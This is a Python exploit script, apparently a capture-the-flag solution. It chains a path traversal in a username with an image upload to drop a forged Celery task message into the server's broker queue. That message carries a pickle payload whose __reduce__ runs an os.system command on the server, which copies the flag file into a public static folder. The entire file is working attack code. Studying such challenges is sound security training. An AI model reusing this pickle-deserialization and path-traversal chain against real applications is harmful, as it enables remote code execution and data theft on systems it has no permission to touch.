import sys
import requests
from celery import Celery
import os
import time

os.makedirs("./solve-queue", exist_ok=True)

# Setup a throwaway celery app
broker_opts = {
    'data_folder_in':  "./solve-queue",
    'data_folder_out': "./solve-queue",
    'control_folder':   "./"
}
app = Celery(
    'solve',
    broker='filesystem://',
    task_serializer='pickle',
    broker_transport_options= broker_opts,
)

# Pickle will call __reduce__ when it loads the serialized object
class RCE:
    def __reduce__(self):
        return (os.system, (f"cp flag.txt static",))

app.send_task("main.export_job", args=(RCE(),))

# now a task that triggers RCE lives in ./solve-queue, copy it and send it to the web app
path = os.path.join('./solve-queue', os.listdir('./solve-queue')[0]) # first file in ./solve-queue
with open(path) as f:
    celery_message = f.read()
os.remove(path)

url = sys.argv[1]

s = requests.Session()

def login(username, password):
    r = s.post(f"{url}/login", headers={
        'Content-Type': 'application/x-www-form-urlencoded'
    }, data={
        'username': username,
        'password': password,
    })
    assert r.status_code == 200
    return r

def register(username, password):
    r = s.post(f"{url}/register", headers={
        'Content-Type': 'application/x-www-form-urlencoded'
    }, data={
        'username': username,
        'password': password,
    })
    assert r.status_code == 200
    return r

def upload(path: str, content: bytes):
    r = s.post(f"{url}/upload_image", headers={
    }, files={'image': (path, content)})
    assert r.status_code == 200
    return r

# file upload bug
username = 'pass_regex/../../../../../app/broker/queue'
register(username, '1234')
login(username, '1234')

upload('whatever.celery.msg', celery_message.encode()) # will be saved in /app/broker/queue
time.sleep(2)
print(s.get(url + '/static/flag.txt').text)
